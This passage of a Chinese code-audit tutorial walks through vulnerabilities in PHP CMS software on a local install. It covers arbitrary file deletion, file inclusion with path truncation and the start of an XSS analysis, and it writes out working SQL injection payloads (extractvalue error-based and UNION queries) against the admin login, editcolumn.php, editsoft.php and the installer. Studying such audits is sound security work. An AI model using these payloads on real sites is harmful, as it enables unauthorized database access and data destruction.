看起来的话是没有什么过滤的，不过前面有个query函数，跟进查看一下<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756913.png"/></p>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756926.png"/><br/>
可以发现当它查询这个id在结果中没有的时候，它就会把错误返回，那这个时候就无法继续运行了，而我们如果想实现任意文件删除的话，变量id肯定是要写成文件名的，那这个时候无法往下运行，这个也就无法实现任意文件删除，因此这个实现不了任意文件删除</p>
<h4 data-content="1" id="700ea7f2ab255780b69df9e33f4dd40e">face_pic3参数</h4>
<p>这个有多个参数中涉及了<code>unlink</code>函数，我们挨个进行查看<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756075.png"/><br/>
这里的话可以发现这个<code>face_pic3</code>是在unlink函数下的，跟进这个变量会发现也只在这里提及，因此这里的话不存在过滤，此时如果这个else语句能执行，我们就可以通过控制这个变量来实现任意文件删除，此时看看上面语句<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756254.png"/><br/>
它是在<code>act</code>变量为<code>edit_user_info</code>下的，因此我们令act为<code>edit_user_info</code>即可，而后发现这些变量不传不会跳出，我们就不填这些变量即可，然后来到这个if-else语句，为了让else语句执行，所以if的条件是不能满足的，if里的条件是<code>face_pic1</code>不为空，我们这里让它为空就可以执行else语句，因此按理说直接post传<code>face_pic3</code>就可以实现任意文件删除，尝试<br/>
我们这里本地是有shell.jpg的，我们删除它来试试<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756262.png"/><br/>
发包<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756369.png"/><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756398.png"/><br/>
成功实现。</p>
<h4 data-content="1" id="c0beba081c04160ddef5e319b28ac497">lit_pic参数</h4>
<p>发现这个<code>lit_pic</code>变量<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756425.png"/>然后跟进变量的话发现它是只出现在这里的，这意味着它这个变量是没有其他过滤的，这里我们也不需要输入单引号或者双引号，直接让<code>lit_pic</code>等于我们想删除的文件夹名即可实现任意文件删除，但是要实现这个，肯定需要满足上面的条件，这样才能往下进行，因此我们从上面的语句开始看<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756511.png"/><br/>
只有这个<br/>
首先满足这个，所以我们就需要写<code>title</code>变量<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756606.png"/><br/>
姓名和电话，这意味着<code>link_man</code>和<code>link_phone</code>也是需要填写的，还有开始的变量<code>lit_pic</code>,这里post传入的也就是四个变量，这个时候先看看我们本地的文件<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756666.png"/><br/>
可以发现是有shell.php的，我们尝试删除它，即让<code>lit_pic</code>的值为它<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756831.png"/><br/>
此时查看本地<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756880.png"/><br/>
成功实现了任意文件删除</p>
<h1 data-content="1" id="5fb3f7319b80173ca494b8be18316906">熊海cms</h1>
<h2 data-content="1" id="de89a4bcb1405d1f6a34bba4844362c9">环境搭建</h2>
<p>下载地址<a href="https://down.chinaz.com/soft/36930.htm" target="_blank">https://down.chinaz.com/soft/36930.htm</a><br/>
安装后访问<code>install</code>界面<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756958.png"/><br/>
填写完成过后点确定即可<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756982.png"/><br/>
此时再访问index.php<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756214.png"/><br/>
配置完成</p>
<h2 data-content="1" id="f7d4ecb3c2ec19d687c92531d7dd87d5">了解CMS结构</h2>
<p>结构如下<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756110.png"/><br/>
对应功能如下</p>
<blockquote>
<p>admin         --管理后台文件夹<br/>
css           --存放css的文件夹<br/>
files         --存放页面的文件夹<br/>
images        --存放图片的文件夹<br/>
inc           --存放网站配置文件的文件夹<br/>
install       --网站进行安装的文件夹<br/>
seacmseditor  --编辑器文件夹<br/>
template      --模板文件夹<br/>
upload        --上传功能文件夹<br/>
index.php     --网站首页</p>
</blockquote>
<h2 data-content="1" id="491247da4a167ab7640359e233159fdd">工具扫描</h2>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756431.png"/><br/>
发现存多个漏洞，包括<code>SQL注入</code>和<code>任意文件包含</code>等，下面开始进行分析</p>
<h3 data-content="1" id="81bcb4c6d663aacbe7ff8055f481152b">文件包含</h3>
<h4 data-content="1" id="86ac76f612a8f7c25d10682498de4471">index.php</h4>
<p>源码如下</p>
<div class="highlight"><pre><span></span><span class="o">&lt;?</span><span class="n">php</span>
<span class="c1">//单一入口模式</span>
<span class="n">error_reporting</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span> <span class="c1">//关闭错误显示</span>
<span class="n">$file</span><span class="o">=</span><span class="n">addslashes</span><span class="o">(</span><span class="n">$_GET</span><span class="o">[</span><span class="sc">'r'</span><span class="o">]);</span> <span class="c1">//接收文件名</span>
<span class="n">$action</span><span class="o">=</span><span class="n">$file</span><span class="o">==</span><span class="err">'</span><span class="sc">'?'</span><span class="n">index</span><span class="err">'</span><span class="o">:</span><span class="n">$file</span><span class="o">;</span> <span class="c1">//判断为空或者等于index</span>
<span class="n">include</span><span class="o">(</span><span class="err">'</span><span class="n">files</span><span class="o">/</span><span class="err">'</span><span class="o">.</span><span class="na">$action</span><span class="o">.</span><span class="err">'</span><span class="o">.</span><span class="na">php</span><span class="err">'</span><span class="o">);</span> <span class="c1">//载入相应文件</span>
</pre></div>
<p>可以发现这里没有包含什么文件，开始看代码。<br/>
这个的话是get传参了一个变量r，这个r被<code>addslashes</code>函数包裹<br/>
然后把这个值赋给了file变量，此时有个三元运算符，如果变量file为空就令file等于index同时赋值给action变量，否则就令变量file为变量r的值，然后赋值给action变量<br/>
此时包含了这个action变量，在action前后进行了拼接。</p>
<p>这里的代码就读到这就结束了，然后我们需要了解一下这个<code>addslashes</code>函数</p>
<div class="highlight"><pre><span></span><span class="n">addslashes</span> <span class="err">—</span> <span class="n">使用反斜线引用字符串</span>
<span class="n">该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线</span><span class="err">。</span><span class="n">这些字符是单引号</span><span class="err">（'）、</span><span class="n">双引号</span><span class="err">（"）、</span><span class="n">反斜线</span><span class="err">（\）</span><span class="n">与</span> <span class="n">NUL</span><span class="err">（</span><span class="n">NULL</span> <span class="n">字符</span><span class="err">）。</span>
</pre></div>
<p>也就是说对单引号、双引号、反斜线和NUL进行了转义，这里的话我们的路径一般用的是<code>./</code>这些，不受影响，因此这里的话我们先在本地放一个1.php文件，写入phpinfo()<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756477.png"/><br/>
传一下看看是否能成功上传<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756558.png"/><br/>
成功</p>
<p>那如果不是php文件的话，这里该怎么进行利用呢，这个时候就用到了路径长度截断，在bluecms中也曾利用过，这里我们再次尝试<br/>
先在本地放一个txt文件<br/>
内容为phpinfo即可，具体如下<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756581.png"/><br/>
采用路径长度截断(.号长度大于256即可)<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756675.png"/><br/>
注</p>
<div class="highlight"><pre><span></span><span class="n">但这个经过测试</span><span class="err">，</span><span class="n">只有在php版本为5</span><span class="mf">.2.17</span><span class="n">时可以成功</span><span class="err">，</span><span class="n">其他情况都不行</span>
</pre></div>
<p>这个的话是可以成功进行文件包含的，看下一处</p>
<h4 data-content="1" id="bad10cf052f4e5418866e54f5a6d8934">admin/index.php</h4>
<div class="highlight"><pre><span></span><span class="o">&lt;?</span><span class="n">php</span>
<span class="c1">//单一入口模式</span>
<span class="n">error_reporting</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span> <span class="c1">//关闭错误显示</span>
<span class="n">$file</span><span class="o">=</span><span class="n">addslashes</span><span class="o">(</span><span class="n">$_GET</span><span class="o">[</span><span class="sc">'r'</span><span class="o">]);</span> <span class="c1">//接收文件名</span>
<span class="n">$action</span><span class="o">=</span><span class="n">$file</span><span class="o">==</span><span class="err">'</span><span class="sc">'?'</span><span class="n">index</span><span class="err">'</span><span class="o">:</span><span class="n">$file</span><span class="o">;</span> <span class="c1">//判断为空或者等于index</span>
<span class="n">include</span><span class="o">(</span><span class="err">'</span><span class="n">files</span><span class="o">/</span><span class="err">'</span><span class="o">.</span><span class="na">$action</span><span class="o">.</span><span class="err">'</span><span class="o">.</span><span class="na">php</span><span class="err">'</span><span class="o">);</span> <span class="c1">//载入相应文件</span>
<span class="o">?&gt;</span>
</pre></div>
<p>代码同上，这里肯定也可以进行文件包含，思路同上即可，不再演示</p>
<h3 data-content="1" id="c43cbda50b8fa2c8fd9d218ce009859e">SQL注入</h3>
<p>这种的话可以先测测登录点，一般都是admin，这种登录框的可能会出现SQL注入，先测试一下是否是单引号闭合的<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756075.png"/></p>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756065.png"/><br/>
报错，有戏<br/>
既然报了个错，那就用个报错注入好了<br/>
爆库</p>
<div class="highlight"><pre><span></span><span class="x">1' and (extractvalue(1,concat(0x7e,(select database()  limit 1,1),0x7e)))#</span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756211.png"/><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756194.png"/><br/>
爆表</p>
<div class="highlight"><pre><span></span><span class="x">1' and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()  limit 1,1),0x7e)))#</span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756247.png"/><br/>
后面按照常规注入即可，此时看看后端代码</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> 
<span class="nb">ob_start</span><span class="p">();</span>
<span class="k">require</span> <span class="s1">'../inc/conn.php'</span><span class="p">;</span>
<span class="nv">$login</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'login'</span><span class="p">];</span>
<span class="nv">$user</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'user'</span><span class="p">];</span>
<span class="nv">$password</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>
<span class="nv">$checkbox</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'checkbox'</span><span class="p">];</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$login</span><span class="o">&lt;&gt;</span><span class="s2">""</span><span class="p">){</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM manage WHERE user='</span><span class="si">$user</span><span class="s2">'"</span><span class="p">;</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">'SQL语句有误：'</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="nv">$users</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>  
<span class="k">echo</span> <span class="s2">"&lt;Script language=JavaScript&gt;alert('抱歉，用户名或者密码错误。');history.back();&lt;/Script&gt;"</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="nv">$passwords</span><span class="o">=</span><span class="nv">$users</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span><span class="o">&lt;&gt;</span><span class="nv">$passwords</span><span class="p">){</span>
<span class="k">echo</span> <span class="s2">"&lt;Script language=JavaScript&gt;alert('抱歉，用户名或者密码错误。');history.back();&lt;/Script&gt;"</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;</span>
</pre></div>
<p>发现user是没有进行过滤的，直接放入了select语句中，造成了SQL注入</p>
<h4 data-content="1" id="7bf7bc71f89747a8d23941a48a55119c">admin/files/adset.php(失败)</h4>
<div class="highlight"><pre><span></span><span class="o">&lt;?</span><span class="n">php</span>
<span class="n">require</span> <span class="err">'</span><span class="o">../</span><span class="n">inc</span><span class="o">/</span><span class="n">checklogin</span><span class="o">.</span><span class="na">php</span><span class="err">'</span><span class="o">;</span>
<span class="n">require</span> <span class="err">'</span><span class="o">../</span><span class="n">inc</span><span class="o">/</span><span class="n">conn</span><span class="o">.</span><span class="na">php</span><span class="err">'</span><span class="o">;</span>
<span class="n">$setopen</span><span class="o">=</span><span class="err">'</span><span class="n">class</span><span class="o">=</span><span class="s">"open"</span><span class="err">'</span><span class="o">;</span>
<span class="n">$query</span> <span class="o">=</span> <span class="s">"SELECT * FROM adword"</span><span class="o">;</span>
<span class="n">$resul</span> <span class="o">=</span> <span class="n">mysql_query</span><span class="o">(</span><span class="n">$query</span><span class="o">)</span> <span class="n">or</span> <span class="nf">die</span><span class="o">(</span><span class="err">'</span><span class="n">SQL语句有误</span><span class="err">：'</span><span class="o">.</span><span class="na">mysql_error</span><span class="o">());</span>
<span class="n">$ad</span> <span class="o">=</span> <span class="n">mysql_fetch_array</span><span class="o">(</span><span class="n">$resul</span><span class="o">);</span>

<span class="n">$save</span><span class="o">=</span><span class="n">$_POST</span><span class="o">[</span><span class="err">'</span><span class="n">save</span><span class="err">'</span><span class="o">];</span>
<span class="n">$ad1</span><span class="o">=</span><span class="n">addslashes</span><span class="o">(</span><span class="n">$_POST</span><span class="o">[</span><span class="err">'</span><span class="n">ad1</span><span class="err">'</span><span class="o">]);</span>
<span class="n">$ad2</span><span class="o">=</span><span class="n">addslashes</span><span class="o">(</span><span class="n">$_POST</span><span class="o">[</span><span class="err">'</span><span class="n">ad2</span><span class="err">'</span><span class="o">]);</span>
<span class="n">$ad3</span><span class="o">=</span><span class="n">addslashes</span><span class="o">(</span><span class="n">$_POST</span><span class="o">[</span><span class="err">'</span><span class="n">ad3</span><span class="err">'</span><span class="o">]);</span>
<span class="k">if</span> <span class="o">(</span><span class="n">$save</span><span class="o">==</span><span class="mi">1</span><span class="o">){</span>
<span class="n">$query</span> <span class="o">=</span> <span class="s">"UPDATE adword SET </span>
<span class="s">ad1='$ad1',</span>
<span class="s">ad2='$ad2',</span>
<span class="s">ad3='$ad3',</span>
<span class="s">date=now()"</span><span class="o">;</span>
</pre></div>
<p>可以看到这里的话有这个<code>"UPDATE adword SET 
ad1='$ad1'</code>语句，我们这里可控的变量是ad1，但ad1被单引号包裹了，我们如果想要进行SQL注入的话肯定需要闭合单引号，此时我们看ad1的传入方式，发现<code>$ad1=addslashes($_POST['ad1']);</code>，它被这个<code>addslashes</code>函数包裹了，这就意味着我们的单引号输入后会被转义，那也就无法闭合之前的语句，因此无法实现SQL注入，这里是误报了属于是</p>
<h4 data-content="1" id="2ea57cc5a70e84a0cf16bf7dc12285ba">admin/files/editcolumn.php</h4>
<p>部分代码如下</p>
<div class="highlight"><pre><span></span><span class="o">&lt;?</span><span class="n">php</span>
<span class="n">require</span> <span class="err">'</span><span class="o">../</span><span class="n">inc</span><span class="o">/</span><span class="n">checklogin</span><span class="o">.</span><span class="na">php</span><span class="err">'</span><span class="o">;</span>
<span class="n">require</span> <span class="err">'</span><span class="o">../</span><span class="n">inc</span><span class="o">/</span><span class="n">conn</span><span class="o">.</span><span class="na">php</span><span class="err">'</span><span class="o">;</span>
<span class="n">$columnopen</span><span class="o">=</span><span class="err">'</span><span class="n">class</span><span class="o">=</span><span class="s">"open"</span><span class="err">'</span><span class="o">;</span>
<span class="n">$id</span><span class="o">=</span><span class="n">$_GET</span><span class="o">[</span><span class="err">'</span><span class="n">id</span><span class="err">'</span><span class="o">];</span>
<span class="n">$type</span><span class="o">=</span><span class="n">$_GET</span><span class="o">[</span><span class="err">'</span><span class="n">type</span><span class="err">'</span><span class="o">];</span>

<span class="k">if</span> <span class="o">(</span><span class="n">$type</span><span class="o">==</span><span class="mi">1</span><span class="o">){</span>
<span class="n">$query</span> <span class="o">=</span> <span class="s">"SELECT * FROM nav WHERE id='$id'"</span><span class="o">;</span>
<span class="n">$resul</span> <span class="o">=</span> <span class="n">mysql_query</span><span class="o">(</span><span class="n">$query</span><span class="o">)</span> <span class="n">or</span> <span class="nf">die</span><span class="o">(</span><span class="err">'</span><span class="n">SQL语句有误</span><span class="err">：'</span><span class="o">.</span><span class="na">mysql_error</span><span class="o">());</span>
<span class="n">$nav</span> <span class="o">=</span> <span class="n">mysql_fetch_array</span><span class="o">(</span><span class="n">$resul</span><span class="o">);</span>
<span class="o">}</span>
<span class="k">if</span> <span class="o">(</span><span class="n">$type</span><span class="o">==</span><span class="mi">2</span><span class="o">){</span>
<span class="n">$query</span> <span class="o">=</span> <span class="s">"SELECT * FROM navclass WHERE id='$id'"</span><span class="o">;</span>
<span class="n">$resul</span> <span class="o">=</span> <span class="n">mysql_query</span><span class="o">(</span><span class="n">$query</span><span class="o">)</span> <span class="n">or</span> <span class="nf">die</span><span class="o">(</span><span class="err">'</span><span class="n">SQL语句有误</span><span class="err">：'</span><span class="o">.</span><span class="na">mysql_error</span><span class="o">());</span>
<span class="n">$nav</span> <span class="o">=</span> <span class="n">mysql_fetch_array</span><span class="o">(</span><span class="n">$resul</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>这里我们可以看见到这个id参数是可控的，虽然它被包裹在单引号中，但id的传参是直接get传参的，此时就剩下两个开头的包含文件了，如果包含的文件是没有过滤的话，那这里应该就是可以进行SQL注入的，查看这两个文件<br/>
conn.php内容如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type:text/html;charset=utf-8'</span><span class="p">);</span>
    <span class="k">require</span> <span class="s1">'conn.info.php'</span><span class="p">;</span>
    <span class="c1">//常量参数</span>
    <span class="nb">define</span><span class="p">(</span><span class="s1">'DB_HOST'</span><span class="p">,</span><span class="nv">$DB_HOST</span><span class="p">);</span>
    <span class="nb">define</span><span class="p">(</span><span class="s1">'DB_USER'</span><span class="p">,</span><span class="nv">$DB_USER</span><span class="p">);</span>
    <span class="nb">define</span><span class="p">(</span><span class="s1">'DB_PWD'</span><span class="p">,</span><span class="nv">$DB_PWD</span><span class="p">);</span>
    <span class="nb">define</span><span class="p">(</span><span class="s1">'DB_NAME'</span><span class="p">,</span><span class="nv">$DB_NAME</span><span class="p">);</span>

    <span class="c1">//第一步，连接MYSQL服务器</span>
    <span class="nv">$conn</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nx">DB_HOST</span><span class="p">,</span><span class="nx">DB_USER</span><span class="p">,</span><span class="nx">DB_PWD</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /install'</span><span class="p">));</span>

    <span class="c1">//第二步，选择指定的数据库，设置字符集</span>
    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nx">DB_NAME</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">'数据库错误，错误信息：'</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">());</span>
    <span class="nb">mysql_query</span><span class="p">(</span><span class="s1">'SET NAMES UTF8'</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">'字符集设置错误'</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">());</span>
    <span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'PRC'</span><span class="p">);</span> <span class="c1">//设置中国时区</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>连接数据库的文件，再查看另一个<br/>
checklogin.php内容如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$user</span><span class="o">=</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'user'</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$user</span><span class="o">==</span><span class="s2">""</span><span class="p">){</span>
<span class="nb">header</span><span class="p">(</span><span class="s2">"Location: ?r=login"</span><span class="p">);</span>
<span class="k">exit</span><span class="p">;</span>   
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>这个是检验是否登录的<br/>
因此这里不存在过滤，接下来去尝试一下SQL注入<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756298.png"/><br/>
尝试闭合</p>
<div class="highlight"><pre><span></span><span class="x">r=editcolumn&amp;type=2&amp;id=1'  --+</span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756672.png"/><br/>
成功，接下来查看字段数<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756689.png"/><br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756717.png"/><br/>
字段数为9，接下来查看回显位<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756750.png"/><br/>
3、4、5、8都可以，随便整一个开始注入</p>
<div class="highlight"><pre><span></span><span class="x">r=editcolumn&amp;type=2&amp;id=-1' union select 1,2,database(),4,user(),6,7,@@version,9 --+</span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756778.png"/><br/>
成功注入</p>
<h4 data-content="1" id="a76262564fdbd55205713cd75a3ed152">admin/files/editsoft.php</h4>
<p>部分源码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'../inc/checklogin.php'</span><span class="p">;</span>
<span class="k">require</span> <span class="s1">'../inc/conn.php'</span><span class="p">;</span>
<span class="nv">$wzlistopen</span><span class="o">=</span><span class="s1">'class="open"'</span><span class="p">;</span>
<span class="nv">$id</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM download WHERE id='</span><span class="si">$id</span><span class="s2">'"</span><span class="p">;</span>
<span class="nv">$resul</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">'SQL语句有误：'</span><span class="o">.</span><span class="nx">mysql_Aerror</span><span class="p">());</span>
<span class="nv">$download</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$resul</span><span class="p">);</span>
</pre></div>
<p>可以看出是类似于上面那个文件的，尝试用上关方法去进行SQL注入<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756794.png"/><br/>
查询字段数<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756271.png"/></p>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756308.png"/><br/>
字段数为18，查看回显位<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756439.png"/><br/>
开始联合查询</p>
<div class="highlight"><pre><span></span><span class="x">r=editsoft&amp;type=2&amp;id=-1'union select 1,database(),3,4,5,6,7,8,9,user(),@@version,12,13,14,15,16,17,18--+</span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756429.png"/><br/>
成功注入</p>
<h4 data-content="1" id="5db3c0e7daf3ee0592d5bd57a00ff466">downloads. php</h4>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756344.png"/><br/>
这里的话可以发现是id参数是被<code>')</code>包裹的，且来自于变量<code>fileid</code>，<code>fileid</code>变量是由cid参数经过<code>addlashes</code>函数后得到的，那这里的话单引号肯定就会被转义了，想闭合语句的话不太可能，所以这里的话SQL注入是没戏，这里算是G了。</p>
<h4 data-content="1" id="3f87f669239cdbb8e41c62e853916121">install/index.php</h4>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756371.png"/><br/>
在此处发现有update语句和可控的变量<code>password</code>和<code>username</code>，查看这两个变量的传入方式<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756796.png"/><br/>
可以发现是直接传入的，没有什么过滤，那么这里就可以在user变量处尝试SQL注入了<br/>
单引号测试<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756855.png"/><br/>
结果如下<br/>
<img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756869.png"/><br/>
尝试报错注入</p>
<div class="highlight"><pre><span></span><span class="x">1' and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#</span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756881.png"/></p>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756902.png"/></p>
<p>爆表</p>
<div class="highlight"><pre><span></span><span class="x">1' and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()  limit 1,1),0x7e)))#</span>
</pre></div>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756958.png"/></p>
<p><img src="https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141756232.png"/></p>
<h3 data-content="1" id="5815f4426002f950d3a6371a063b9b7f">XSS</h3>
<h4 data-content="1" id="dfabbe8a8aa3a695ec4bfaef6a100441">admin/files/adset.php</h4>
<p>关键代码如下</p>
<div class="highlight"><pre><span></span><span class="x">&lt;div class="form-group"&gt;</span>
<span class="x">&lt;label class="col-lg-4 control-label"&gt;广告一&lt;/label&gt;</span>
<span class="x">&lt;div class="col-lg-8"&gt;</span>
<span class="x">&lt;textarea name="ad1" class="form-control col-lg-12" placeholder="ad-1"&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$ad</span><span class="p">[</span><span class="s1">'ad1'</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">&lt;/textarea&gt;                                  </span>
<span class="x">&lt;/div&gt;</span>
<span class="x">&lt;/div&gt;</span>
</pre></div>
<p>可以发现这里的变量ad1是可控的，然后他是在<code>&lt;/textarea&gt;</code>标签中，如果闭合了这个标签，是不是就意味着我们可以构造自己的语句，也就可以写xss了，此时看一下传变量的方式</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'../inc/checklogin.php'</span><span class="p">;</span>
<span class="k">require</span> <span class="s1">'../inc/conn.php'</span><span class="p">;</span>
<span class="nv">$setopen</span><span class="o">=</span><span class="s1">'class="open"'</span><span class="p">;</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM adword"</span><span class="p">;</span>
<span class="nv">$resul</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">'SQL语句有误：'</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="nv">$ad</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$resul</span><span class="p">);</span>

<span class="nv">$save</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'save'</span><span class="p">];</span>
<span class="nv">$ad1</span><span class="o">=</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ad1'</span><span class="p">]);</span>
<span class="nv">$ad2</span><span class="o">=</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ad2'</span><span class="p">]);</span>
<span class="nv">$ad3</span><span class="o">=</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ad3'</span><span class="p">]);</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$save</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"UPDATE adword SET </span>
<span class="s2">ad1='</span><span class="si">$ad1</span><span class="s2">',</span>
<span class="s2">ad2='</span><span class="si">$ad2</span><span class="s2">',</span>
<span class="s2">ad3='</span><span class="si">$ad3</span><span class="s2">',</span>
<span class="s2">date=now()"</span><span class="p">;</span>
<span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">'修改错误：'</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">());</span>
<span class="k">echo</span> <span class="s2">"&lt;script&gt;alert('亲爱的，广告设置成功更新。');location.href='?r=adset'&lt;/script&gt;"</span><span class="p">;</span> 
<span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
